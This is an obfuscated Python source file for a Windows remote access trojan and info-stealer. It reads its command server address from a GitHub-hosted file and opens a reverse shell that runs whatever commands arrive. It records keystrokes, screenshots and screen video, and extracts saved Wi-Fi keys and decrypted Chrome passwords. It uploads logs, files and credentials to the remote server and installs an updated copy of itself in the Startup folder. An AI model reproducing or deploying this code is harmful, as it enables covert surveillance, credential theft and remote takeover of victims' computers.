import subprocess,socket,time,requests,os,logging,imageio,json,sqlite3,win32crypt,base64,shutil
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
from Cryptodome.Cipher import AES
wZxJzNu = ""
RNEWCLmuWkLcEpc = ""
JCverMGyqhWOpmwChL = "17.12.24.2"
EgWAYIbbCAHPltQduGkAxt = "!"
OCQtgLeXfZe = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
SSMQeABcMUEPilZtikwU = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
TkpMlFaVwmp = os.path.expanduser("~\\AppData\\Local\\")
def UWvvUtYN(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def RngKhFNXpkRmEqcsJ(s):
	hNojDjOjslJiKN = s.recv(1024)
	if len(hNojDjOjslJiKN)==0:
		return True
	zuqAIBmWkwusnqRljr = hNojDjOjslJiKN.decode("utf-8").replace("\n","")
	if not zuqAIBmWkwusnqRljr.startswith(EgWAYIbbCAHPltQduGkAxt):
		proc = subprocess.run(zuqAIBmWkwusnqRljr, shell=True, capture_output=True)
		vOITEmXosUcGVigsGOmi = proc.stdout + proc.stderr
		s.send(vOITEmXosUcGVigsGOmi)
		return
	bMzRTyRMJGxEXHv = zuqAIBmWkwusnqRljr.split(" ")[0][1:]
	args = " ".join(zuqAIBmWkwusnqRljr.split()[1:]).split()
	if bMzRTyRMJGxEXHv == "download":
		BlsMTrrZPkwoJLBJvoi(s, zuqAIBmWkwusnqRljr)
	elif bMzRTyRMJGxEXHv == "screenshot":
		BGScWktWxg(s)
	elif bMzRTyRMJGxEXHv == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif bMzRTyRMJGxEXHv == "update":
		rEoYBFvsDQFiAJQJVTXWFC(s)
	elif bMzRTyRMJGxEXHv == "wifi":
		wePEMWRnKHCNwquPq(s)
	elif bMzRTyRMJGxEXHv == "screenrecord":
		fjykAAepKZ(s, args)
	elif bMzRTyRMJGxEXHv == "chrome":
		decryptPasswords(s)
def BlsMTrrZPkwoJLBJvoi(s, zuqAIBmWkwusnqRljr):
	yGccNghpLhPUUvBJl = zuqAIBmWkwusnqRljr.replace(EgWAYIbbCAHPltQduGkAxt+"download ","").split(",")
	vOITEmXosUcGVigsGOmis = ""
	for f in yGccNghpLhPUUvBJl:
		vOITEmXosUcGVigsGOmis += XbHdRtnuFyeqntgW(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(vOITEmXosUcGVigsGOmis, "utf-8"))
def BGScWktWxg(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	EfCMbSshSn = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(EfCMbSshSn)
	image.close()
	r = XbHdRtnuFyeqntgW(EfCMbSshSn, "api/sscap")
	os.remove(EfCMbSshSn)
	s.send(bytes(r,"utf-8"))
def fjykAAepKZ(s, args):
	RICDuGxBzsUghR = 15
	if not args == []:
		try: RICDuGxBzsUghR = int(args[0])
		except: pass
	GWZlyUGWeBnpqoYjHPmoV = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	TgLbbzRXQQgJDsY = []
	fps = 11
	numFrames = RICDuGxBzsUghR * fps
	for _ in range(numFrames):
		TgLbbzRXQQgJDsY.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(GWZlyUGWeBnpqoYjHPmoV, TgLbbzRXQQgJDsY, fps=fps, quality=8)
	XbHdRtnuFyeqntgW(GWZlyUGWeBnpqoYjHPmoV, "api/screc")
def XbHdRtnuFyeqntgW(FVWpVeAoAjjcrUXJCQIZMf, jOKbMbGtJeyGhsoefp, bZHGPTXsFbuyodVZQU=None):
	if not os.path.isfile(FVWpVeAoAjjcrUXJCQIZMf):
		return "[!] 404: "+FVWpVeAoAjjcrUXJCQIZMf+"\n"
	headers = {"user":os.getlogin()}
	if bZHGPTXsFbuyodVZQU is not None:
		headers = {**headers, **bZHGPTXsFbuyodVZQU}
	f = open(FVWpVeAoAjjcrUXJCQIZMf, "rb")
	requests.post("http://"+wZxJzNu+":5555/"+jOKbMbGtJeyGhsoefp,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200\n"
def uploadData(hNojDjOjslJiKNToSend, jOKbMbGtJeyGhsoefp):
	if hNojDjOjslJiKNToSend.strip() == "":
		return "[!] 204\n"
	requests.post("http://"+wZxJzNu+":5555/"+jOKbMbGtJeyGhsoefp,
		hNojDjOjslJiKN=hNojDjOjslJiKNToSend,
		headers={"user":os.getlogin()});
	return "[+] 200\n"
def rEoYBFvsDQFiAJQJVTXWFC(s):
	h, p, v = idewYWpyysPAzDDGuGdXl(True)
	if (v != JCverMGyqhWOpmwChL):
		eMMKOaAj(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def wePEMWRnKHCNwquPq(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	IYSwAtAHbuQzsxgusaVOwsE = ""
	for p in profiles:
		try: IYSwAtAHbuQzsxgusaVOwsE+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: IYSwAtAHbuQzsxgusaVOwsE+=f"    {p} - N/A\n"
	s.send(bytes(IYSwAtAHbuQzsxgusaVOwsE, "utf-8"))
def eMMKOaAj(aktraVBqPllCksGVT):
	uhmcNffbja = os.path.basename(__file__)
	fileType = uhmcNffbja.split(".")[-1]
	ocTQsADfFKQ = uhmcNffbja.split(".")[0]+"."+aktraVBqPllCksGVT+".pyw" if fileType.startswith("py") else ".exe"
	uVWItYMrmXJLi = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), ocTQsADfFKQ)
	if not os.path.isfile(uVWItYMrmXJLi):
		with open(uVWItYMrmXJLi, "w+") as f:
			f.write(requests.get(SSMQeABcMUEPilZtikwU+"file."+ "pyw" if uVWItYMrmXJLi.split(".")[-1].startswith("py") else "exe").text)
def idewYWpyysPAzDDGuGdXl(force=False):
	global wZxJzNu, RNEWCLmuWkLcEpc
	if force or wZxJzNu == "" or RNEWCLmuWkLcEpc == "":
		hNojDjOjslJiKN = requests.get(OCQtgLeXfZe).text.replace("\n","").split(":")
		wZxJzNu = hNojDjOjslJiKN[0].strip()
		RNEWCLmuWkLcEpc = hNojDjOjslJiKN[1].strip()
		aktraVBqPllCksGVT = hNojDjOjslJiKN[2].strip()
	return wZxJzNu, RNEWCLmuWkLcEpc, aktraVBqPllCksGVT
def lcbGanJQhuUAuokSjBLcbv():
	try:
		nIflqTVnR = "settings.xpb"
		IUbXoudovEsG = sorted([file for file in os.listdir(TkpMlFaVwmp) if os.path.isfile(TkpMlFaVwmp+"\\"+file) and file.endswith(nIflqTVnR.split(".")[-1])])
		if nIflqTVnR in IUbXoudovEsG:
			IUbXoudovEsG.remove(nIflqTVnR)
		JUJEnfkVuczyrx = os.path.join(TkpMlFaVwmp,nIflqTVnR)
		if len(IUbXoudovEsG) > 0:
			with open(JUJEnfkVuczyrx, "ab+") as f:
				for file in IUbXoudovEsG:
					temp = os.path.join(TkpMlFaVwmp,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		XbHdRtnuFyeqntgW(JUJEnfkVuczyrx, "api/log")
		if os.path.isfile(JUJEnfkVuczyrx):
			os.remove(JUJEnfkVuczyrx)
	except:
		pass
def SiSniKwlxSxNfOwSKdaM():
	logging.basicConfig(filename=(TkpMlFaVwmp+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def VDtbFbdxVDpPpLlyRYi(k):
		logging.info(str(k))
	k=Listener(on_press=VDtbFbdxVDpPpLlyRYi)
	aNMWqfnvsIO = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in aNMWqfnvsIO:
		l.setLevel(logging.CRITICAL)
	k.start()
def decryptPasswords(s, upload=False):
	local = os.path.expanduser("~\\AppData\\Local\\")
	basePath = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\")
	enckey = None
	with open(basePath+"Local State", "r") as f:
		localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
		enckey = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
	shutil.copyfile(basePath+"\\Default\\Login Data", local+"\\db.db")
	conn = sqlite3.connect(local+"\\db.db")
	cursor = conn.cursor()
	cursor.execute("SELECT action_url, username_value, password_value FROM logins")
	logins = []
	for index, login in enumerate(cursor.fetchall()):
		ciphertext = login[2]
		initVector = ciphertext[3:15]
		encryptedPwd = ciphertext[15:-16]
		cipher = AES.new(enckey, AES.MODE_GCM, initVector)
		decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
		logins.append([login[0], login[1], decryptedPwd])
	cursor.close()
	conn.close()
	os.remove(local+"\\db.db")
	hNojDjOjslJiKN = "\n"
	for login in logins:
		hNojDjOjslJiKN += f"URL: {login[0]}\nUser: {login[1]}\nValue: {login[2]}\n\n"
	if not upload:
		s.send(bytes(hNojDjOjslJiKN,"utf-8"))
	else:
		r=uploadData(hNojDjOjslJiKN, "api/google")
		s.send(bytes(r,"utf-8"))
def oFBXcfs():
	h, p, v = idewYWpyysPAzDDGuGdXl()
	lcbGanJQhuUAuokSjBLcbv()
	decryptPasswords(None,True)
	if JCverMGyqhWOpmwChL != v:
		eMMKOaAj(v)
	SiSniKwlxSxNfOwSKdaM()
	hfiEGRTsjBcXoplzrbc = bytes(("(old)"if JCverMGyqhWOpmwChL!=v else "")+"["+JCverMGyqhWOpmwChL+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				nxYUIRFtEsZKddEiGrE=False
				try:
					s=UWvvUtYN(h, p)
					while not nxYUIRFtEsZKddEiGrE:
						s.send(hfiEGRTsjBcXoplzrbc)
						nxYUIRFtEsZKddEiGrE=RngKhFNXpkRmEqcsJ(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
oFBXcfs()
